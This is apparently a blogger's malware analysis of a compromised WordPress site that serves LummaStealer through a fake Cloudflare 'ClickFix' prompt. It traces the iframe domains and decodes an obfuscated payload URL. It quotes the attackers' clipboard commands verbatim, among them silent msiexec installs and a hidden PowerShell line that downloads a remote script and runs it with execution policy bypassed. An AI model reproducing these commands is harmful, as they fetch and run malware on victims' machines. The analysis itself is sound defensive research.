---
layout: post
title:  "LummaStealer Infected Website"
date:   2025-06-16 21:00:00 +1000
categories: malware analysis
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Overview - LummaStealer Malware Analysis (27th July 2025)

A look into how LummaStealer is delivered by a compromised website. 

LummaStealer has lots of different variants. Therefore, malware analysis found online varies significantly. A compromised website I've been monitoring that has pushed three different samples of LummaStealer to it's victims in the past week. Furthermore, each time you query the stage one domain the network IOCs rotate. So, it's super neat. One cool pickup that does seem consistent is. If your host in running in Russian, the malware terminates.

### ClickFix Prompt Compromised Website

I've booted up my Windows 10 VM so we can whack this through and see what happens.

Here is the Clickfix prompt on load. First, lets see how this got here? Where from? I've checked the Network tab in dev tools and found two suspicious domains that my browser has received HTTP requests from as a result of visiting this website
- api[.]brainbotfilebeatsave[.]com
- fullporner[.]com

![Stage 1](/images/cloudflare_stage1.PNG)
![Stage 2](/images/cloudflare_stage2.PNG)

So why are we sending GET requests to brainbot by visiting the website and the Clickfix prompt above? This little iframe here.

![BrainBot iframe](/images/brainbot_iframe.PNG)

We can see we sent a GET request to brainbot and as a response received some HTML/CSS/JS. The IP of brainbot is 104.21.48.1. Which is a CloudFlare proxy IP. Side note but an important one - adversaries seem to use cloudflare IPs to mask the IPs of their webservers quite frequently. Given that this attack uses a cloudflare clickfix prompt its more believable for level 0 soc analysts triaging this alert. 

![First GET Request to Brainbot](/images/get_brainbot.PNG)

Secondly we can see a GET request fullporner[.]com directly after sending a GET request to brainbot. 

![First GET Request to FullPorner](/images/fullporner_referral.PNG)

Let's inspect the script brainbot sent to us after our GET request.

First up we can see functions for browser fingerprinting and IP checking. Actually, what's really cool is the .js makes you query IP config sites yourself! 

![IP query](/images/ip_query.PNG)

Now we have the .html, .css and a bit of .js that displays the fake verification page and captures the results. 

![Cloudflare Clickfix](/images/cloudflare_html.PNG)

At the start of the .html we have an iFrame to fullporner[.]com but it doesn't look like it does anything? Now I'm almost certain this for some sort of decoy. I thought maybe brainbot was retrieving suspicious stuff from fullporner[.]com but nope. I was wrong. I guess if a SOC analyst looks at this alert they might think it's some dodgy porn page, rather than a LummaStealer loader. I'm not too sure, this is hilarious.

![iFrame](/images/full_porner.PNG)

Ok now lets get into the good stuff. 

![sjsh function](/images/sjsh_malicious_function.PNG)

We can see the function (sjsh) sends a GET request to an unknown domain. When loaded, it copies the constant 'command' to the users clipboard. Now the spuds have commented out earlier payloads. So we can infact see four different payloads! Interesting there is both a powershell and multiple msiexec payloads. This goes back to my comment earlier, there is so many different payloads for Lumma. Anyway, lets have a look at what some of the flags mean in these payload commands. 
1. ```const command = `msiexec /qn /i ${gotourl};```
- (/i) = tells msiexec to install the following package
- (/qn) = quiet mode with no UI for install
2. ```//const command = `msiexec KLSK=1101 /package ${gotourl} /promptrestart LAPBO=189 /quiet NIANS=299;```
3. ```const command = `msiexec SKSIA=1401 /package ${gotourl} /promptrestart LAPBOS=119 /passive NIANS=299;```
- (/package) = specifies .msi to install (same as /i)
- (/promptrestart) = restarts prompt at end if needed
- (/quiet) = quiet mode install
- KLSK, LAPBO, NIANS. These aren't msiexec flags. They could potentially define custom properties in the .msi file.
4. ```//const command = `powershell -w h -c "$f=$env:TEMP+'\\'+[guid]::NewGuid()+'.ps1';curl ${gotourl} -o $f;powershell -w h -ep Bypass -f $f"`;```
- (-wh h) = WindowStyle and hidden
- (-c) = command
- ($f=$env:TEMP+'\\'+[guid]::NewGuid()+'.ps1') = Creates random .ps1 script in Temp directory
- (curl ${gotourl} -o $f) = Downloads file from URL
- (-ep Bypass) = disables execution policy
- (-f) = runs file

Now we can see the payload, but no domains. So lets check out the variable ```gotourl``` is calculated because I reckon it'll give us the domain. It looks heavily obfuscated. Here is a snippet of the .js of it. Here is a step by step breakdown of it.
![Go To URL](/images/go_to_url.PNG)

1. Function takes the 'jsh' value when the function is called
2. Sends a GET request to brainbot using the following URL parameter ```/?jsc=<jsh>&f=<f>&t=<rt>```
3. If the request is successful (200) we receive a base64 string.
- ```let gotourl = hex2a(strrev(atob(hex2a(strrev(atob(xhr.response))))))```
- B64 decodes raw response (atob(xhr.response))
- Reverses the string (strrev(atob_returned_value))
- Converts string to ASCII (hex2a(strrev_returned_value))
- Now repeat again! Because there are 6 layers!
4. Now we have our domain ```window.gotourl = URL```

So now we know how this works. Lets try grab this domain. After clicking the tick box, I send a GET request to brainbot with the jsc flag. This contains all the details brainbot needs to shoot me back a domain.

![encoded jsc](/images/jsc_obfuscate.PNG)

Now this is what brainbot returned. Also side note you can see the requests to the IP check domains on the side as well.

![brainbot base64 response](/images/brainbot_response.PNG)

Lastly, lets deobfuscate. My friend ChatGPT will assist here.

![gospel output](/images/payload_url.PNG)

Plot twist! You have got to be joking. So essentially what this means is. LummaStealer is getting it's payloads from FullPorner. Now becuase it's .php we can't view it in a browser. 

When I go to paste the command in run I get the domain 'veriqloudx' not 'fullporner'. Anyway, veriq was created two days ago. Pretty neat, good rep on VT. Nice.
![VT Veriqloudx](/images/veriq_rep.PNG)

### So how was the website compromised?

After running some basic recon scans on my own environment that replicated the website but slightly different here's what I can see:
- Hosted on Fastly
- Sitting behind FlyWheel WAF
- Using WordPress version 6.8.1 (Released - April 30, 2025)
- WordPress Theme 'Gaspard'
- Managed by FlyWheel
- Using Yoast SEO 25.5 Premium WP Plugin
- Every request to any directory returns a 301 to Clickfix

Nothing sticks out that is blatantly obvious.